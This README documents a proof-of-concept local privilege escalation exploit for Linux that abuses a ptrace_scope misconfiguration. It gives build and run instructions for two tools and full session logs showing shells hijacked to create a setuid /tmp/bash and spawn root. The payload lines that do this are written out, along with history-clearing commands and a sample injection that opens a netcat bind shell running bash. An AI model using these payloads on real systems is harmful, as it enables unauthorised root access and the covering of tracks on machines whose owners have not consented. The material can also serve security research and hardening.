# ptrace misconfiguration local privilege escalation
ptrace misconfiguration Local Privilege Escalation

WARNING! this is a POC, the code is CRAP

Injecting code via ptrace in shells with sudo executed

Exploit Reqs:
* ptrace enable to attach the processes of the attacker user
* terminal with a sudo user group (attacker)
* terminal with the same user & sudo authenticated (victim)
* run xpk or ptrex (if GDB is installed is more safe run this: https://www.exploit-db.com/exploits/46989)

my code is using ptrace (no GDB dep) 

based from (GDB dep): https://www.exploit-db.com/exploits/46989

'ptrace_scope' misconfiguration Local Privilege Escalation by Marcelo Vazquez (s4vitar) & Victor Lasa (vowkin)

## xpk.c
Local Privilege Escalation via stdin hijack (using ptrace_do lib https://github.com/emptymonkey/ptrace_do): sudo -S cp /bin/bash /tmp + sudo -S chmod +s /tmp/bash + history -c 
```
gcc -o xpk xpk.c
./xpk
```

## ptrex.c:
Local Privilege Escalation via shellcode injection execve + python -c import os; os.system("echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1"); import pty; pty.spawn("/bin/bash");
```
gcc -o ptrex ptrex.c
 ./ptrex 
```

You can also inject your own python code: ./ptrex full_python_path newcmdline
```
./ptrex /home/dreg/tmp/python 'import os; os.system("/usr/bin/sudo /bin/nc -lvp 4444 -e /bin/bash")'
```

## How to test xpk.c:
Open a terminal with a sudo user group

execute any command with sudo and enter the password, ex:
```
dreg@fr33project:~$ tty
/dev/pts/4
dreg@fr33project:~$ id
uid=1003(dreg) gid=1003(dreg) groups=1003(dreg),27(sudo)
dreg@fr33project:~$ sudo whoami
[sudo] password for dreg:
root
dreg@fr33project:~$ 
```

open other terminal with the same user and execute ./xpk (the name of the exploit executable is important, dont change!)
```
dreg@fr33project:~$ tty
/dev/pts/7
dreg@fr33project:~$ .gcc -o xpk xpk.c
dreg@fr33project:~$ ./xpk
David Reguera Garcia aka Dreg exploit without gdb dep, based in:
https://www.exploit-db.com/exploits/46989
'ptrace_scope' misconfiguration Local Privilege Escalation
Authors: Marcelo Vazquez  (s4vitar)
         Victor Lasa       (vowkin)

[*] PID -> bash
[*] Path 2660: /home/dreg
stdin fd: 4
echo "clear && echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1 | echo && history -c && clear" >> /tmp/crap
[*] PID -> bash
[*] Path 2892: /home/dreg
stdin fd: 4
echo "clear && echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1 | echo && history -c && clear" >> /tmp/crap
[*] PID -> sh
[*] Path 2998: /home/dreg
stdin fd: 4
echo "clear && echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1 | echo && history -c && clear" >> /tmp/crap
[*] PID -> bash
[*] Path 2999: /home/dreg
stdin fd: 4
echo "clear && echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1 | echo && history -c && clear" >> /tmp/crap

[*] Cleaning up...
[*] Spawning root shell...
bash-5.0# id
uid=1003(dreg) gid=1003(dreg) euid=0(root) egid=0(root) groups=0(root),27(sudo),1003(dreg)
bash-5.0# whoami
root
bash-5.0#
```

## How to test ptrex.c:
Open a terminal with a sudo user group

execute any command with sudo and enter the password, ex:
```
dreg@fr33project:~$ tty
/dev/pts/4
dreg@fr33project:~$ id
uid=1003(dreg) gid=1003(dreg) groups=1003(dreg),27(sudo)
dreg@fr33project:~$ sudo whoami
[sudo] password for dreg:
root
dreg@fr33project:~$ 
```

open other terminal with the same user and execute ./xpk (the name of the exploit executable is important, dont change!)
```
dreg@fr33project:~$ tty
/dev/pts/7
dreg@fr33project:~$ .gcc -o ptrex ptrex.c
dreg@fr33project:~$ ./ptrex
ptrex v0.3-beta - MIT License - Copyright 2020
David Reguera Garcia aka Dreg - dreg@fr33project.org
http://github.com/David-Reguera-Garcia-Dreg/ - http://www.fr33project.org/
-
ptrace misconfiguration Local Privilege Escalation
using ptrace (no GDB dep) execve
-
Based from: https://www.exploit-db.com/exploits/46989
'ptrace_scope' misconfiguration Local Privilege Escalation by Marcelo Vazquez (s4vitar) & Victor Lasa (vowkin)

To change default python path & cmd injected: ./ptrex full_python_path newcmdline
    example: ./ptrex /home/dreg/tmp/python 'import os; os.system("/usr/bin/sudo /bin/nc -lvp 4444 -e /bin/bash")'

/proc/sys/kernel/yama/ptrace_scope : 0
pgrep "^(echo $(cat /etc/shells | tr '/' ' ' | awk 'NF{print $NF}' | tr '\n' '|'))$" -u "$(id -u)" | sed '$ d'
current pid: 18888
skipping current shell pid: 18888
current pid: 20156
elf plat: 64
waiting for process
getting registers
injecting shellcode at: 0x00007f33a88890e9
setting instruction pointer to: 0x00007f33a88890e9
runing
please wait...
found suid shell: /tmp/bash
rooting.....
/tmp/bash -p -c 'rm /tmp/bash ; tput cnorm && /bin/bash -p'

bash-5.0# whoami
root
bash-5.0#
```
